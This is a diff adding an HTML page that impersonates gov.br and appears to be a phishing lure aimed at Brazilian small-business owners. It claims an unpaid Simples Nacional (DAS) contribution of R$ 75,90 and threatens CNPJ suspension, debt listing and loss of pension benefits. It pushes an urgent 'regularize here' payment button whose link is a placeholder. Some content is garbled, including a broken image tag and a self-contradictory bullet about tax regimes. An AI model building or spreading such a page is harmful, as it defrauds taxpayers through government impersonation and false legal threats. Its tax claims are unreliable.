@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>gov.br — Regularização</title>
+  <style>
+    :root{
+      --bg:#ffffff;
+      --fg:#111827;
+      --muted:#6b7280;
+      --primary:#0ea5e9; /* azul do botão */
+      --primary-hover:#0284c7;
+      --border:#e5e7eb;
+      --accent:#f3f4f6;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial,"Noto Sans",sans-serif;
+      line-height:1.6;
+      color:var(--fg);
+      background:var(--bg);
+    }
+    .wrap{
+      max-width:900px;
+      margin:0 auto;
+      padding:32px 24px 56px;
+    }
+    header{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      margin-bottom:16px;
+    }
+    .logo{
+      font-weight:800;
+      font-size:48px;
+      letter-spacing:-1px;
+      line-height:1;
+      display:inline-flex;
+      gap:6px;
+      user-select:none;
+    }
+    .logo .g{color:#2563eb}
+    .logo .o{color:#f59e0b}
+    .logo .v{color:#22c55e}
+    .logo .br{color:#111827}
+
+    h1,h2,h3{line-height:1.3;margin:1.25em 0 .5em}
+    h1{font-size:clamp(20px,2.4vw,26px)}
+    h2{font-size:clamp(18px,2.2vw,22px)}
+    h3{font-size:clamp(16px,2vw,20px)}
+    p{margin:.6em 0}
+
+    .card{
+      background:#fff;
+      border:1px solid var(--border);
+      border-radius:14px;
+      padding:18px 18px;
+      box-shadow:0 2px 6px rgba(0,0,0,.04);
+    }
+
+    .muted{color:var(--muted)}
+    .money{font-weight:700}
+
+    .btn{
+      display:inline-block;
+      width:100%;
+      text-align:center;
+      padding:14px 18px;
+      border-radius:12px;
+      border:1px solid transparent;
+      background:var(--primary);
+      color:#fff;
+      font-weight:700;
+      text-decoration:none;
+      transition:background-color .15s ease, transform .02s ease;
+      margin-top:10px;
+    }
+    .btn:hover{background:var(--primary-hover)}
+    .btn:active{transform:translateY(1px)}
+
+    .kicker{font-size:14px;color:var(--muted)}
+    .hr{height:1px;background:var(--border);margin:20px 0}
+
+    ul{padding-left:18px}
+    li{margin:.4em 0}
+
+    footer{margin-top:28px;color:var(--muted);font-size:14px}
+
+    @media (max-width:640px){
+      .wrap{padding:20px 16px 40px}
+      .logo{font-size:40px}
+    }
+    @media print{
+      .btn{display:none}
+      .card{box-shadow:none}
+    }
+  </style>
+</head>
+<body>
+  <main class="wrap">
+    <header aria-label="Identidade gov.br">
+      <div class="logo" aria-hidden="true">
+        <!--<span class="g">g</span><span class="o">o</span><span class="v">v</span><span class="br">.br</span> -->
+	<img <img src="logo.png" alt="Logo">
+
+      </div>
+    </header>
+
+    <section class="card" aria-labelledby="intro">
+      <p id="intro">Prezado(a) Contribuinte,</p>
+      <p>Até a presente data o pagamento da sua contribuição obrigatória referente à abertura da sua empresa não foi identificado.</p>
+
+      <h2>Registro Nacional de Empresas *</h2>
+      <p>O não pagamento do Documento de Arrecadação do Simples Nacional (DAS) pode levar à inclusão do débito na dívida ativa da União, o que permite o protesto e a inscrição do CNPJ em órgãos de proteção ao crédito.</p>
+
+      <h3>Como regularizar</h3>
+      <p>A regularização pode ser efetuada de forma imediata através do botão abaixo.</p>
+      <p class="kicker">Instruções: toque no botão e, em seguida, siga as orientações exibidas para realizar o pagamento e regularizar. Você pode acessar pelo celular ou computador.</p>
+      <a class="btn" href="#" target="_blank" rel="noopener" aria-label="Clique aqui para regularizar">CLIQUE AQUI PARA REGULARIZAR</a>
+
+      <div class="hr" role="separator" aria-hidden="true"></div>
+
+      <p><strong>Valor Atual <span class="money">R$ 75,90</span></strong></p>
+
+      <h3>As consequências do não pagamento do Simples Nacional incluem:</h3>
+      <ul>
+        <li><strong>Suspensão do CNPJ.</strong> Seu CNPJ será suspenso/cancelado.</li>
+        <li><strong>Multas e juros:</strong> o CNPJ estará sujeito ao pagamento de multas e juros sobre o valor não pago. Esses encargos podem aumentar o valor a ser quitado.</li>
+        <li><strong>Restrições no acesso a benefícios:</strong> o não pagamento do DAS pode resultar na restrição de acesso a benefícios previdenciários, como aposentadoria, auxílio-doença e salário-maternidade, entre outros.</li>
+        <li><strong>Exclusão do regime do CNPJ:</strong> se o CNPJ acumular débitos e não regularizar a situação, ele poderá ser excluído do regime do CNPJ. Nesse caso, ele perderá os benefícios e facilidades oferecidos pelo CNPJ e poderá ter que migrar para outro regime tributário, como o Simples Nacional.</li>
+      </ul>
+
+      <footer>
+        <p>O Simples Nacional é um regime compartilhado de arrecadação, cobrança e fiscalização de tributos aplicável às Microempresas e Empresas de Pequeno Porte, previsto na Lei Complementar nº 123, de 14 de dezembro de 2006. Abrange a participação de todos os entes federados (União, Estados, Distrito Federal e Municípios).</p>
+      </footer>
+    </section>
+  </main>
+</body>
+</html>
